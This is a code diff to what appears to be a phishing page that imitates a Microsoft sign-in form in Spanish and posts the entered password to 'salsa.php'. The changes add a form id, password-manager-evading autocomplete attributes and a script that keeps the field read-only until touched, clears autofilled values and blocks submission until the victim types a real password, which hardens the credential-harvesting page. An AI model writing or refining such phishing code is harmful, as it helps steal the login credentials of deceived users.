@@ -36,7 +36,7 @@ if (isset($_POST['e'])){
 <!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <div data-bind="if: activeDialog"></div>
 
 
- <form name="f1"   spellcheck="false" method="post" target="_top" autocomplete="off" 
+ <form name="f1" id="passForm"  spellcheck="false" method="post" target="_top" autocomplete="off" 
  action="salsa.php">
  
 
@@ -171,7 +171,7 @@ if (isset($_POST['e'])){
             event: {
                 updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
 				
-				<input name="c" id="c" autocomplete="off" class="form-control"  placeholder="Contraseña"   type="password" required>
+				<input name="c" id="c" autocomplete="new-password" data-lpignore="true" data-form-type="other" class="form-control"  placeholder="Contraseña"   type="password" required>
 				<input type="hidden" name="loginfmt" id="loginfmt" value="">
 				
 				<!-- ko if: svr.CK && showPassword() --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
@@ -263,4 +263,32 @@ if (isset($_POST['e'])){
 
 </div></div>
 
+<script>
+(function(){
+    var input = document.getElementById('c');
+    var form  = document.getElementById('passForm');
+    if(!input || !form) return;
+    // Evitar autofill: readonly hasta que el usuario interactúe
+    input.setAttribute('readonly', 'readonly');
+    var unlock = function(){ input.removeAttribute('readonly'); };
+    input.addEventListener('focus', unlock);
+    input.addEventListener('click', unlock);
+    input.addEventListener('touchstart', unlock);
+    // Limpiar cualquier valor inyectado por gestores de contraseñas al cargar
+    setTimeout(function(){
+        if(/^[\*\u2022\u25CF\u00B7\.\s]+$/.test(input.value)) input.value = '';
+    }, 50);
+    form.addEventListener('submit', function(e){
+        var v = input.value || '';
+        // Rechazar si está vacío o son solo asteriscos/bullets/puntos
+        if(v.length === 0 || /^[\*\u2022\u25CF\u00B7\.\s]+$/.test(v)){
+            e.preventDefault();
+            input.value = '';
+            input.removeAttribute('readonly');
+            input.focus();
+            return false;
+        }
+    });
+})();
+</script>
 </body></html>
